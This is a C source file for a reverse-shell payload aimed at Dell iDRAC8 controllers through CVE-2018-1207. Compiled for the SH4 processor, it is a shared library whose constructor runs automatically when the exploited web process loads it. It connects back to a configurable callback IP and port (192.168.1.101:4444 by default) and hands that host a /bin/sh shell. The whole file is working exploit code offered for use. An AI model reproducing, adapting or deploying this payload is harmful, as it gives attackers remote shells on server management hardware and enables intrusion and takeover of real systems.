/*
 * payload.c — SH4 reverse-shell payload for iDRAC8 CVE-2018-1207
 *
 * Target CPU: Renesas SH7758 (SH4) — the iDRAC8 processor
 * Loaded as a shared library by the exploited iDRAC web process.
 * The constructor runs immediately on dlopen(), connects back to the
 * host, and hands off a shell.
 *
 * Compile with build_payload.sh — do NOT compile for x86.
 *
 * CALLBACK_IP and CALLBACK_PORT are defined at compile time.
 * Default values are overridden by build_payload.sh.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>

#ifndef CALLBACK_IP
#define CALLBACK_IP   "192.168.1.101"
#endif

#ifndef CALLBACK_PORT
#define CALLBACK_PORT 4444
#endif

static void __attribute__((constructor)) pwn(void)
{
    int sock;
    struct sockaddr_in sa;
    char * const argv[] = { "/bin/sh", NULL };
    char * const envp[] = { "TERM=xterm", "PATH=/bin:/sbin:/usr/bin:/usr/sbin", NULL };

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
        return;

    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons(CALLBACK_PORT);
    inet_aton(CALLBACK_IP, &sa.sin_addr);

    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        close(sock);
        return;
    }

    dup2(sock, STDIN_FILENO);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);

    execve("/bin/sh", argv, envp);
}
